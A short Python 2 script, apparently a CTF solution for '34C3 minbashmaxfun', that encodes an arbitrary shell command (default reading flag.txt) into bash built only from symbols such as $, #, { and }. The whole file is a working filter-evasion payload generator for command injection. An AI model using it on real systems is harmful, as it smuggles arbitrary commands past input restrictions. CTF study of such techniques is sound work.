import sys
# https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60
a = "bash -c 'cat flag.txt'"
if len(sys.argv) == 2:
    a = sys.argv[1]

out = r"${!#}<<<{"

for c in "bash -c ":
    if c == ' ':
        out += ','
        continue
    out += r"\$\'\\"
    out += r"$(($((${##}<<${##}))#"
    for binchar in bin(int(oct(ord(c))[1:]))[2:]:
        if binchar == '1':
            out += r"${##}"
        else:
            out += r"$#"
    out += r"))"
    out += r"\'"

out += r"\$\'"
for c in a:
    out += r"\\"
    out += r"$(($((${##}<<${##}))#"
    for binchar in bin(int(oct(ord(c))[1:]))[2:]:
        if binchar == '1':
            out += r"${##}"
        else:
            out += r"$#"
    out += r"))"
out += r"\'"

out += "}"
print out
